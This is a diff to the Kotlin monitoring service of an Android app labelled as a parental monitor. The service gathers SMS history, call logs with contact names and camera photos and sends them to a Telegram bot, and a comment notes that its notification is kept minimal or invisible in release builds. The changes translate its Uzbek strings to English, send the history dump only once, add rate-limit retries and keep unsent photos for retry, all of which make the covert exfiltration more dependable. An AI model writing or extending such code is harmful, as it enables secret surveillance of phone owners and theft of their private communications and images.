@@ -12,18 +12,17 @@ import com.redeye.parentalmonitor.data.MessageQueue
 import com.redeye.parentalmonitor.data.PreferencesManager
 import com.redeye.parentalmonitor.network.TelegramClient
 import com.redeye.parentalmonitor.network.TelegramMessage
-import com.redeye.parentalmonitor.receiver.NetworkChangeReceiver
+import com.redeye.parentalmonitor.utils.MessageScheduler
 import com.redeye.parentalmonitor.repository.CallLogRepository
 import com.redeye.parentalmonitor.repository.SmsRepository
 import com.redeye.parentalmonitor.utils.NetworkUtils
+import com.redeye.parentalmonitor.utils.TimeFmt
 import kotlinx.coroutines.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
-import java.text.SimpleDateFormat
-import java.util.*
 
 class MonitoringService : Service() {
 
@@ -62,6 +61,10 @@ class MonitoringService : Service() {
 
     private fun startMonitoring() {
         android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
+
+        // Cancel any previous loops so a restart never duplicates work
+        monitoringJob?.cancel()
+        cameraJob?.cancel()
         
         // In RELEASE mode, make notification invisible/minimal
         val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
@@ -103,19 +106,21 @@ class MonitoringService : Service() {
         }
         android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
 
-        // Send initial data
-        serviceScope.launch {
-            android.util.Log.i("MonitoringService", "Starting initial data collection...")
-            sendInitialData()
-            android.util.Log.i("MonitoringService", "Initial data collection completed")
+        // Send initial data only once per device (never re-dump history on reboot)
+        if (!preferencesManager.initialSyncDone) {
+            serviceScope.launch {
+                android.util.Log.i("MonitoringService", "Starting initial data collection...")
+                sendInitialData()
+                android.util.Log.i("MonitoringService", "Initial data collection completed")
+            }
         }
 
-        // Start periodic monitoring
+        // Start periodic monitoring (honors the user-configured interval)
         monitoringJob = serviceScope.launch {
             while (isActive) {
                 try {
                     checkAndSendNewData()
-                    delay(60000) // Check every minute
+                    delay(syncIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
                     e.printStackTrace()
@@ -166,15 +171,15 @@ class MonitoringService : Service() {
             // Send start message
             android.util.Log.i("MonitoringService", "Sending start message...")
             val startMessage = buildString {
-                appendLine("📱 <b>Nazorat boshlandi</b>")
+                appendLine("📱 <b>Monitoring started</b>")
                 appendLine()
-                appendLine("⏰ Vaqt: ${formatDate(System.currentTimeMillis())}")
+                appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                 appendLine()
-                appendLine("📊 Topilgan ma'lumotlar:")
-                appendLine("• SMS: ${allSms.size} ta")
-                appendLine("• Qo'ng'iroqlar: ${allCalls.size} ta")
+                appendLine("📊 Found on device:")
+                appendLine("• SMS: ${allSms.size}")
+                appendLine("• Calls: ${allCalls.size}")
                 appendLine()
-                appendLine("Tarix yuborilmoqda...")
+                appendLine("Sending history...")
             }
             sendToTelegram(startMessage)
             delay(2000) // Wait 2 seconds before sending history
@@ -186,21 +191,21 @@ class MonitoringService : Service() {
                 chunks.forEachIndexed { index, chunk ->
                     android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
                     val message = buildString {
-                        appendLine("💬 <b>SMS Tarixi - ${index + 1}/${chunks.size}-qism</b>")
+                        appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
                         chunk.forEach { sms ->
-                            appendLine("📞 Raqam: ${sms.address}")
+                            appendLine("📞 Number: ${sms.address}")
                             val body = sms.body.take(200) // Limit SMS body to 200 chars
-                            appendLine("📝 Matn: $body${if (sms.body.length > 200) "..." else ""}")
-                            appendLine("🔄 Turi: ${sms.getTypeString()}")
-                            appendLine("⏰ Vaqt: ${formatDate(sms.date)}")
+                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
+                            appendLine("🔄 Type: ${sms.getTypeString()}")
+                            appendLine("⏰ Time: ${formatDate(sms.date)}")
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
                     // Check message length (Telegram limit: 4096)
                     if (message.length > 4000) {
                         android.util.Log.w("MonitoringService", "Message too long (${message.length}), splitting...")
-                        sendToTelegram(message.take(4000) + "\n\n... (xabar uzun)")
+                        sendToTelegram(message.take(4000) + "\n\n... (message truncated)")
                     } else {
                         sendToTelegram(message)
                     }
@@ -216,23 +221,23 @@ class MonitoringService : Service() {
                 chunks.forEachIndexed { index, chunk ->
                     android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
                     val message = buildString {
-                        appendLine("📞 <b>Qo'ng'iroqlar Tarixi - ${index + 1}/${chunks.size}-qism</b>")
+                        appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
                         chunk.forEach { call ->
-                            appendLine("📱 Raqam: ${call.number}")
+                            appendLine("📱 Number: ${call.number}")
                             if (call.name != null) {
-                                appendLine("👤 Ism: ${call.name}")
+                                appendLine("👤 Name: ${call.name}")
                             }
-                            appendLine("🔄 Turi: ${call.getTypeString()}")
-                            appendLine("⏱️ Davomiyligi: ${call.getDurationString()}")
-                            appendLine("⏰ Vaqt: ${formatDate(call.date)}")
+                            appendLine("🔄 Type: ${call.getTypeString()}")
+                            appendLine("⏱️ Duration: ${call.getDurationString()}")
+                            appendLine("⏰ Time: ${formatDate(call.date)}")
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
                     // Check message length
                     if (message.length > 4000) {
                         android.util.Log.w("MonitoringService", "Message too long (${message.length}), truncating...")
-                        sendToTelegram(message.take(4000) + "\n\n... (xabar uzun)")
+                        sendToTelegram(message.take(4000) + "\n\n... (message truncated)")
                     } else {
                         sendToTelegram(message)
                     }
@@ -241,12 +246,14 @@ class MonitoringService : Service() {
                 android.util.Log.i("MonitoringService", "All call chunks sent")
             }
 
+            preferencesManager.initialSyncDone = true
+
             // Final message
             android.util.Log.i("MonitoringService", "Sending completion message...")
             val completeMessage = buildString {
-                appendLine("✅ <b>Tarix yuborish tugadi</b>")
+                appendLine("✅ <b>History sync complete</b>")
                 appendLine()
-                appendLine("Endi faqat yangi SMS va qo'ng'iroqlar yuboriladi.")
+                appendLine("From now on, only new SMS and calls will be sent.")
             }
             sendToTelegram(completeMessage)
             android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
@@ -292,15 +299,15 @@ class MonitoringService : Service() {
 
     private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
         return buildString {
-            appendLine("💬 <b>Yangi SMS (${smsList.size} ta)</b>")
+            appendLine("💬 <b>New SMS (${smsList.size})</b>")
             appendLine()
             
             smsList.forEach { sms ->
-                appendLine("📞 Raqam: ${sms.address}")
+                appendLine("📞 Number: ${sms.address}")
                 val body = sms.body.take(200) // Limit to 200 chars
-                appendLine("📝 Matn: $body${if (sms.body.length > 200) "..." else ""}")
-                appendLine("🔄 Turi: ${sms.getTypeString()}")
-                appendLine("⏰ Vaqt: ${formatDate(sms.date)}")
+                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
+                appendLine("🔄 Type: ${sms.getTypeString()}")
+                appendLine("⏰ Time: ${formatDate(sms.date)}")
                 appendLine("━━━━━━━━━━━━━━━━")
             }
         }
@@ -308,17 +315,17 @@ class MonitoringService : Service() {
 
     private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
         return buildString {
-            appendLine("📞 <b>Yangi qo'ng'iroqlar (${callList.size} ta)</b>")
+            appendLine("📞 <b>New calls (${callList.size})</b>")
             appendLine()
             
             callList.forEach { call ->
-                appendLine("📱 Raqam: ${call.number}")
+                appendLine("📱 Number: ${call.number}")
                 if (call.name != null) {
-                    appendLine("👤 Ism: ${call.name}")
+                    appendLine("👤 Name: ${call.name}")
                 }
-                appendLine("🔄 Turi: ${call.getTypeString()}")
-                appendLine("⏱️ Davomiyligi: ${call.getDurationString()}")
-                appendLine("⏰ Vaqt: ${formatDate(call.date)}")
+                appendLine("🔄 Type: ${call.getTypeString()}")
+                appendLine("⏱️ Duration: ${call.getDurationString()}")
+                appendLine("⏰ Time: ${formatDate(call.date)}")
                 appendLine("━━━━━━━━━━━━━━━━")
             }
         }
@@ -329,18 +336,13 @@ class MonitoringService : Service() {
             // Validate message length (Telegram max: 4096)
             if (message.length > 4096) {
                 android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, truncating")
-                val truncated = message.take(4000) + "\n\n... (xabar qisqartirildi)"
+                val truncated = message.take(4000) + "\n\n... (message truncated)"
                 sendToTelegram(truncated)
                 return
             }
             
             val botToken = preferencesManager.botToken
             val chatId = preferencesManager.chatId
-
-            android.util.Log.d("MonitoringService", "Sending message to Telegram...")
-            android.util.Log.d("MonitoringService", "Bot Token: ${botToken.take(20)}...")
-            android.util.Log.d("MonitoringService", "Chat ID: $chatId")
-            android.util.Log.d("MonitoringService", "Message length: ${message.length} chars")
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
@@ -364,26 +366,20 @@ class MonitoringService : Service() {
                 parseMode = "HTML"
             )
 
-            android.util.Log.d("MonitoringService", "Calling Telegram API...")
             val url = "https://api.telegram.org/bot${botToken}/sendMessage"
-            android.util.Log.d("MonitoringService", "URL: $url")
             val response = TelegramClient.api.sendMessage(url, telegramMessage)
-            
-            android.util.Log.d("MonitoringService", "Response code: ${response.code()}")
-            android.util.Log.d("MonitoringService", "Response successful: ${response.isSuccessful}")
-            
+
             if (response.isSuccessful && response.body()?.ok == true) {
                 android.util.Log.i("MonitoringService", "✓ Message sent successfully!")
-                android.util.Log.i("MonitoringService", "Response: ${response.body()}")
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
+            } else if (response.code() == 429) {
+                val retryAfter = parseRetryAfter(response.errorBody()?.string())
+                android.util.Log.w("MonitoringService", "Rate limited, retrying after ${retryAfter}s")
+                kotlinx.coroutines.delay(retryAfter * 1000L)
+                messageQueue.addMessage(message)
+                MessageScheduler.scheduleMessageSend(this)
             } else {
-                // Failed to send, add to queue
-                val errorBody = response.errorBody()?.string()
-                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()} - ${response.message()}")
-                android.util.Log.e("MonitoringService", "Error body: $errorBody")
-                if (response.body() != null) {
-                    android.util.Log.e("MonitoringService", "Response body: ${response.body()}")
-                }
+                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                 messageQueue.addMessage(message)
             }
         } catch (e: Exception) {
@@ -392,13 +388,29 @@ class MonitoringService : Service() {
             // Network error, add to queue
             messageQueue.addMessage(message)
             // Schedule retry when network is available
-            NetworkChangeReceiver.scheduleMessageSend(this)
+            MessageScheduler.scheduleMessageSend(this)
         }
     }
 
+    private fun syncIntervalMillis(): Long {
+        return preferencesManager.syncInterval.coerceIn(1, 1440) * 60_000L
+    }
+
     private fun formatDate(timestamp: Long): String {
-        val sdf = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault())
-        return sdf.format(Date(timestamp))
+        return TimeFmt.full(timestamp)
+    }
+
+    private fun parseRetryAfter(errorBody: String?): Long {
+        return try {
+            com.google.gson.JsonParser.parseString(errorBody)
+                ?.asJsonObject
+                ?.getAsJsonObject("parameters")
+                ?.get("retry_after")
+                ?.asLong
+                ?.coerceIn(1, 300) ?: 5L
+        } catch (e: Exception) {
+            5L
+        }
     }
 
     private fun stopMonitoring() {
@@ -463,7 +475,7 @@ class MonitoringService : Service() {
             val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
             val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
             
-            val timestamp = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault()).format(Date())
+            val timestamp = TimeFmt.full(System.currentTimeMillis())
             val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())
             
             val url = "https://api.telegram.org/bot$botToken/sendPhoto"
@@ -473,17 +485,28 @@ class MonitoringService : Service() {
             if (response.isSuccessful && response.body()?.ok == true) {
                 android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
+                photoFile.delete()
+            } else if (response.code() == 429) {
+                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
+                prunePhotoCache()
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()}")
+                prunePhotoCache()
             }
-            
-            // Delete photo after sending
-            photoFile.delete()
-            android.util.Log.d("MonitoringService", "Temporary photo file deleted")
-            
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram", e)
-            photoFile.delete()
+            prunePhotoCache()
+        }
+    }
+
+    private fun prunePhotoCache(maxKept: Int = 20) {
+        try {
+            val photos = cacheDir.listFiles { file ->
+                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
+            }?.sortedBy { it.lastModified() } ?: return
+            photos.dropLast(maxKept).forEach { it.delete() }
+        } catch (e: Exception) {
+            android.util.Log.e("MonitoringService", "Error pruning photo cache", e)
         }
     }
 }
